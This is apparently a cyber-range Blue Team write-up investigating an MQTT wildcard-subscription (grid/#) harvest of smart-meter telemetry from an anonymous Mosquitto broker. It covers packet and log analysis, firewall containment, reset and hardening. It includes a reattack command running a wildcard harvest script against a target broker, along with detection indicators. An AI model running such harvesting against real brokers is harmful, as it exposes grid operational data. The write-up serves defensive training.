<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/blue/media/image1.png" title="Figure 1 â€” Live MQTT attack-session overview showing CONNECT, grid/# SUBSCRIBE, retained PUBLISH traffic and DISCONNECT." style="width:6.85in;height:3.50191in" alt="Wireshark packet list showing an external MQTT connection from 152.58.32.244 to 159.89.165.53, a wildcard subscription, server publish traffic and disconnect." />

*Figure 1 â€” Live MQTT attack-session overview showing CONNECT, grid/# SUBSCRIBE, retained PUBLISH traffic and DISCONNECT.*

## 6.2 Unauthorized MQTT client identifier

Filter the CONNECT packet by client identifier:

| mqtt.clientid == "zone1-maint-laptop-07" |
|------------------------------------------|

The MQTT CONNECT details expose the supplied client identifier. Client identifiers are user-controlled and can be spoofed; therefore, correlate this value with the packet source IP and the broker connection log.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/blue/media/image2.png" title="Figure 2 â€” MQTT CONNECT packet showing client ID zone1-maint-laptop-07." style="width:6.85in;height:3.34976in" alt="Wireshark MQTT CONNECT details showing the client identifier zone1-maint-laptop-07 and source and destination IP addresses." />

*Figure 2 â€” MQTT CONNECT packet showing client ID zone1-maint-laptop-07.*

## 6.3 Unauthorized multi-level wildcard subscription

Isolate MQTT SUBSCRIBE traffic:

| mqtt.msgtype == 8 |
|-------------------|

The selected packet shows Topic: grid/# and requested QoS 0. The \# wildcard matches all remaining topic levels beneath grid/, enabling collection of every meter field in every published zone.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/blue/media/image3.png" title="Figure 3 â€” Unauthorized MQTT SUBSCRIBE request for the multi-level wildcard filter grid/#." style="width:6.85in;height:3.57841in" alt="Wireshark MQTT SUBSCRIBE details showing topic grid/# and requested QoS 0." />

*Figure 3 â€” Unauthorized MQTT SUBSCRIBE request for the multi-level wildcard filter grid/#.*

## 6.4 Cross-zone retained telemetry delivery

Filter server-to-client MQTT PUBLISH traffic:

| mqtt.msgtype == 3 && ip.dst == \<ATTACKER-IP\> |
|------------------------------------------------|

The broker returns retained telemetry immediately after acknowledging the subscription. Multiple MQTT PUBLISH messages may be reassembled inside a single TCP segment; this is normal. Expand each MQTT record within the packet details to review individual topics and payloads.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/blue/media/image4.png" title="Figure 4 â€” Broker-to-attacker retained PUBLISH traffic exposing meter telemetry across multiple grid zones." style="width:6.85in;height:3.51959in" alt="Wireshark display showing MQTT publish messages from the broker to the external client, including zone1 and zone2 topics; the continuation packet contains zone3 topics." />

*Figure 4 â€” Broker-to-attacker retained PUBLISH traffic exposing meter telemetry across multiple grid zones.*

## 6.5 M010 outage disclosure

Filter the specific outage topic:

| mqtt.topic == "grid/zone3/meter/M010/outage" |
|----------------------------------------------|

The message payload 74727565 is hexadecimal ASCII for true. The packet therefore proves that the external client received the M010 outage state directly from the broker.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/blue/media/image5.png" title="Figure 5 â€” M010 outage PUBLISH record with topic grid/zone3/meter/M010/outage and payload true." style="width:6.85in;height:3.58792in" alt="Wireshark MQTT publish details showing the M010 outage topic, message bytes 74727565, and highlighted ASCII text true." />

*Figure 5 â€” M010 outage PUBLISH record with topic grid/zone3/meter/M010/outage and payload true.*

## 6.6 Complete M010 operational profile

Filter all M010 topics in the reassembled TCP segment:

| tcp contains "grid/zone3/meter/M010/" |
|---------------------------------------|

The record group reveals the full operational profile: meter ID M010, feeder FEEDER-SOUTH-A, load 0.0, voltage 0.0 and outage true. This confirms that the wildcard subscription exposed both inventory and operational-condition data.

<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/Smart-Meter-Wildcard-Harvest-Red-vs-Blue/blue/media/image6.png" title="Figure 6 â€” Reassembled MQTT records exposing the complete M010 operational profile." style="width:6.85in;height:3.48033in" alt="Wireshark packet details showing MQTT topics for M010 id, feeder, load, voltage and outage fields." />

*Figure 6 â€” Reassembled MQTT records exposing the complete M010 operational profile.*

# 7. Mosquitto broker-log investigation

The Mosquitto log provides application-layer attribution that complements the PCAP. It records the remote socket, MQTT client ID, subscription request and every retained PUBLISH delivered to that client.


INSTALL_ROOT="/opt/ot-challenges/mqtt-smart-meter-wildcard-harvest"

LOG="$INSTALL_ROOT/logs/mosquitto/mosquitto.log"



# Locate connection, subscription and delivery records

grep -nE 'zone1-maint-laptop-07|Received SUBSCRIBE|grid/#|Sending PUBLISH to zone1-maint-laptop-07' "$LOG"


The critical sequence is:

- New client connected from \<ATTACKER-IP\>:\<SOURCE-PORT\> as zone1-maint-laptop-07.

- Received SUBSCRIBE from zone1-maint-laptop-07.

- grid/# (QoS 0).

- Sending SUBACK to zone1-maint-laptop-07.

- A sequence of Sending PUBLISH records for zone1, zone2 and zone3 topics.

- Received DISCONNECT and client disconnected.

## 7.1 Extract the attacker source address

| grep 'New client connected' "\$LOG" \| grep 'zone1-maint-laptop-07' \| tail -n 1 |
|----|

Use the source address from this record for containment. Do not rely on the client ID alone because it is not a trustworthy identity control.

## 7.2 Count the delivered messages

| grep -c 'Sending PUBLISH to zone1-maint-laptop-07' "\$LOG" |
|------------------------------------------------------------|

The validated harvest delivered 60 retained messages. The count corresponds to 3 zones Ã— 4 meters per zone Ã— 5 telemetry fields per meter.

## 7.3 Enumerate affected zones and meters


grep 'Sending PUBLISH to zone1-maint-laptop-07' "$LOG" | awk -F"'" '{print $2}' | cut -d/ -f2 | sort -u



grep 'Sending PUBLISH to zone1-maint-laptop-07' "$LOG" | awk -F"'" '{print $2}' | cut -d/ -f4 | sort -u


Expected zones are zone1, zone2 and zone3. Expected meters are M001 through M012.

# 8. Automated investigation using Blue-Analyze.sh

The native Blue analysis wrapper correlates the broker connection, client identifier, wildcard subscription and delivered topic set. Run it only after preserving the source evidence.


cd /root/Smart-Meter-Wildcard-Harvest/Smart-Meter-Wildcard-Harvest-Red-vs-Blue-Module



./Blue-Analyze.sh



**Validated analysis result**


BLUE_INVESTIGATION:PASS with CLIENT_ID=zone1-maint-laptop-07, SOURCE_IP=<ATTACKER-IP>, FILTER=grid/#, MESSAGES=60, ZONES=3 and METERS=12.


Review the generated structured outputs:


INSTALL_ROOT="/opt/ot-challenges/mqtt-smart-meter-wildcard-harvest"



cat "$INSTALL_ROOT/evidence/blue-investigation-summary.txt"

jq . "$INSTALL_ROOT/evidence/blue-investigation.json"


# 9. Incident timeline and technical findings

Build the incident timeline from the Mosquitto timestamps and packet capture. The exact absolute times depend on the exercise run; preserve the order below.

| **Sequence** | **Event** | **Evidence** |
|----|----|----|
| 1 | External TCP session established to broker port 1883. | PCAP SYN/SYN-ACK/ACK and Mosquitto connection record. |
| 2 | MQTT CONNECT sent with client ID zone1-maint-laptop-07. | Wireshark CONNECT details and broker log. |
| 3 | Broker accepted anonymous connection. | CONNACK success and absence of username/password requirement. |
| 4 | Client requested SUBSCRIBE grid/# at QoS 0. | SUBSCRIBE packet and broker Received SUBSCRIBE record. |
| 5 | Broker acknowledged subscription. | SUBACK packet and broker Sending SUBACK record. |
| 6 | Broker delivered retained telemetry from all three zones. | 60 PUBLISH records in PCAP and Mosquitto log. |
| 7 | M010 outage condition disclosed. | M010 outage topic with payload true; load and voltage 0.0. |
| 8 | Client disconnected after collection. | DISCONNECT packet and broker disconnect record. |

| **Finding** | **Conclusion** |
|----|----|
| Authentication | The client received telemetry without presenting MQTT credentials. |
| Authorization | The broker permitted a broad grid/# subscription instead of restricting the client to an approved zone. |
| Confidentiality impact | Operational telemetry for 12 meters across three zones was disclosed. |
| Operational intelligence | The attacker identified meter inventory, feeder mapping, load, voltage and outage state. |
| Availability | Legitimate telemetry services remained operational; the security state was compromised. |
| Attribution | The source IP and client ID were correlated through PCAP and broker logs. |

# 10. Root-cause analysis and security impact

The primary root cause is inadequate MQTT access control. The broker accepts anonymous clients and does not enforce topic-level least privilege. The grid/# filter therefore becomes an unrestricted collection mechanism.

| **Control weakness** | **Security consequence** |
|----|----|
| Anonymous MQTT access | Any reachable client can establish a broker session. |
| Missing or permissive ACL | Clients can subscribe beyond their operational zone. |
| Unencrypted MQTT on TCP/1883 | Network observers can read client IDs, topic names and payloads. |
| Broad retained telemetry | A single subscription immediately returns a complete operational snapshot. |
| Insufficient alerting | Wildcard subscriptions may remain unnoticed without broker-log or PCAP monitoring. |

The incident primarily affects confidentiality and operational security. An adversary can profile grid assets, identify outage conditions, observe load and voltage values and select high-impact targets for subsequent activity. Repeated collection could also reveal changes in operational state over time.

# 11. Containment procedure

Contain the observed external source without stopping Mosquitto or disrupting legitimate local telemetry. The packaged containment script first performs the Blue correlation and then creates a source-specific firewall rule on TCP/1883.


cd /root/Smart-Meter-Wildcard-Harvest/Smart-Meter-Wildcard-Harvest-Red-vs-Blue-Module



./contain.sh | tee /root/smart-meter-containment.log



**Expected containment result**


BLUE_INVESTIGATION:PASS, BLOCKED_SOURCE_IP=<ATTACKER-IP>, FIREWALL_CHAIN=SMART_METER_CONTAIN and EXTERNAL_SOURCE_CONTAINMENT:PASS.


Verify the firewall chain and rule:


iptables -S INPUT | grep SMART_METER_CONTAIN

iptables -S SMART_METER_CONTAIN


The expected rule pattern is:

| -A SMART_METER_CONTAIN -s \<ATTACKER-IP\>/32 -p tcp -m tcp --dport 1883 -j DROP |
|----|

# 12. Post-containment verification

Containment is successful only when the external attacker is blocked and legitimate local MQTT behavior continues. Run the native validation after applying containment:

| ./validate.sh |
|---------------|


**Expected service result**


SECURITY_STATE remains COMPROMISED for historical accuracy, but SECURITY_VECTOR:PASS STATE=CONTAINED is reported. FAILED_CHECKS=0 and SERVICE_STATUS:UP confirm that the incident is contained without interrupting required services.


From the same external source used in the attack, repeat the collector with a short timeout. The connection should time out and return a non-zero exit code. A validated reattack produced POST_CONTAINMENT_ATTACK_RC=1.


set +e

python3 wildcard_harvest.py --broker <TARGET-IP> --port 1883 --client-id zone1-maint-laptop-07 --topic-filter 'grid/#' --timeout 8 --expected-meters 12 --output ./post-containment-harvest.json --messages-output ./post-containment-messages.jsonl

RC=$?

set -e



echo "POST_CONTAINMENT_ATTACK_RC=$RC"


# 13. Recovery and clean reset

After evidence review and exercise completion, reset the challenge. Reset removes the containment chain, clears the recorded incident state, restarts the native services as required and returns telemetry to the normal baseline.


cd /root/Smart-Meter-Wildcard-Harvest/Smart-Meter-Wildcard-Harvest-Red-vs-Blue-Module



./reset.sh

./validate.sh



**Expected recovery state**


CHALLENGE_RESET:PASS, SECURITY_STATE:NORMAL, SECURITY_VECTOR:PASS STATE=NORMAL, FAILED_CHECKS=0 and SERVICE_STATUS:UP.


Confirm that no containment artifacts remain:


iptables -S SMART_METER_CONTAIN 2>/dev/null || echo "CONTAINMENT_CHAIN_REMOVED:PASS"



iptables -C INPUT -j SMART_METER_CONTAIN 2>/dev/null || echo "CONTAINMENT_JUMP_REMOVED:PASS"


# 14. Hardening and prevention recommendations

| **Priority** | **Recommendation** | **Implementation intent** |
|----|----|----|
| Critical | Disable anonymous access. | Set allow_anonymous false and require authenticated MQTT identities. |
| Critical | Implement per-client topic ACLs. | Permit each operational display to read only its assigned zone, for example grid/zone1/#. |
| High | Use TLS-protected MQTT. | Expose MQTT over TLS, normally TCP/8883, and validate broker certificates. |
| High | Restrict broker network exposure. | Allow TCP/1883 or 8883 only from approved management and operational subnets. |
| High | Alert on multi-level wildcard subscriptions. | Generate alerts for \# and broad + filters, especially from external addresses. |
| High | Monitor new client IDs and source addresses. | Correlate broker logs with approved asset inventory; treat unknown IDs as untrusted. |
| Medium | Reduce retained-data exposure. | Retain only telemetry required for operations and apply least-privilege topic design. |
| Medium | Centralize and protect logs. | Forward Mosquitto and systemd logs to a SIEM with time synchronization and retention. |
| Medium | Create response playbooks. | Automate evidence preservation, source containment and post-containment validation. |


**Important control principle**


Client IDs are not authentication. A malicious client can choose an approved-looking identifier. Strong credentials, certificate-based identity and topic ACLs are required.


# 15. Indicators of compromise and ATT&CK mapping

| **Indicator** | **Value / pattern** | **Use** |
|----|----|----|
| MQTT client ID | zone1-maint-laptop-07 | Stable exercise indicator; correlate with source IP. |
| Subscription filter | grid/# | High-confidence collection indicator. |
| Destination service | TCP/1883 | MQTT broker access point. |
| Example source IP | 152.58.32.244 | Validation-specific; dynamic in future deployments. |
| Expected collection size | 60 PUBLISH messages | Confirms complete retained snapshot. |
| Affected topic scope | grid/zone1/, grid/zone2/, grid/zone3/ | Cross-zone access indicator. |
| Sensitive topic | grid/zone3/meter/M010/outage | Operational outage disclosure. |
| Sensitive payload | true / hex 74727565 | Confirms outage condition. |

| **ATT&CK field** | **Mapping** |
|----|----|
| Matrix | MITRE ATT&CK for ICS |
| Tactic | Collection (TA0100) |
| Technique | Automated Collection (T0802) |
| Observed procedure | An external MQTT client subscribed to grid/# and automatically collected retained telemetry across three operational zones. |

# 16. Blue Team completion checklist

â˜ Preserve the Mosquitto log, PCAP and relevant journal output and record SHA-256 hashes.

â˜ Confirm that Mosquitto and legitimate publishers/subscribers remain operational.

â˜ Identify the external source IP and source port.

â˜ Identify client ID zone1-maint-laptop-07.

â˜ Confirm the grid/# SUBSCRIBE request and successful SUBACK.

â˜ Confirm retained PUBLISH delivery from zone1, zone2 and zone3.

â˜ Count 60 messages and enumerate M001 through M012.

â˜ Confirm M010 on FEEDER-SOUTH-A reports load 0.0, voltage 0.0 and outage true.

â˜ Run Blue-Analyze.sh and verify BLUE_INVESTIGATION:PASS.

â˜ Apply source-specific containment on TCP/1883.

â˜ Verify SERVICE_STATUS:UP with STATE=CONTAINED.

â˜ Verify the external reattack fails with a non-zero return code.

â˜ Reset the challenge and confirm SECURITY_STATE:NORMAL and SERVICE_STATUS:UP.

â˜ Attach screenshots, command output, hashes and the final timeline to the incident record.

# 17. Command-reference appendix

## 17.1 Core variables


INSTALL_ROOT="/opt/ot-challenges/mqtt-smart-meter-wildcard-harvest"

LOG="$INSTALL_ROOT/logs/mosquitto/mosquitto.log"

PCAP="$INSTALL_ROOT/logs/pcap/smart-meter-mqtt.pcap"

MODULE="/root/Smart-Meter-Wildcard-Harvest/Smart-Meter-Wildcard-Harvest-Red-vs-Blue-Module"


## 17.2 Rapid triage


cd "$MODULE"

./validate.sh

systemctl --no-pager --full status mosquitto.service

ss -ltnp | grep ':1883'

tail -n 100 "$LOG"


## 17.3 Broker correlation


grep -nE 'zone1-maint-laptop-07|Received SUBSCRIBE|grid/#|Sending PUBLISH to zone1-maint-laptop-07' "$LOG"



grep -c 'Sending PUBLISH to zone1-maint-laptop-07' "$LOG"


## 17.4 tshark verification


capinfos "$PCAP"



tshark -r "$PCAP" -Y 'mqtt.clientid == "zone1-maint-laptop-07"' -T fields -e frame.time -e ip.src -e ip.dst -e mqtt.clientid



tshark -r "$PCAP" -Y 'mqtt.msgtype == 8' -T fields -e frame.time -e ip.src -e mqtt.topic



tshark -r "$PCAP" -Y 'mqtt.topic == "grid/zone3/meter/M010/outage"' -T fields -e frame.time -e ip.src -e ip.dst -e mqtt.topic -e mqtt.msg_text


## 17.5 Investigation, containment and reset


cd "$MODULE"



./Blue-Analyze.sh

./contain.sh

./validate.sh



iptables -S SMART_METER_CONTAIN



./reset.sh

./validate.sh


# 18. Conclusion

The Blue Team investigation confirmed an unauthorized external MQTT session that used the client identifier zone1-maint-laptop-07 and subscribed to grid/#. Packet analysis and Mosquitto logs showed successful delivery of 60 retained messages covering three zones and 12 meters. The disclosed data included meter identity, feeder, load, voltage and outage state, including M010 on FEEDER-SOUTH-A with load 0.0, voltage 0.0 and outage true.

The incident was contained by blocking the observed external source on TCP/1883 while preserving legitimate broker and telemetry operation. Post-containment validation reported the security state as contained and the service as available, and an external reattack timed out with a non-zero return code. Reset then removed the firewall artifacts and returned the challenge to SECURITY_STATE:NORMAL and SERVICE_STATUS:UP.

The primary remediation is to replace anonymous, unrestricted MQTT access with strong client authentication, TLS, network segmentation and per-client topic ACLs. Monitoring should alert on broad wildcard subscriptions, unknown client identifiers and high-volume retained-message delivery to external sources.


**Document-use note**


This writeup is intended for authorized cyber-range training and Blue Team investigation. All addresses, timestamps and user-controlled identifiers shown in screenshots are exercise artifacts and must be interpreted in the context of the active deployment.

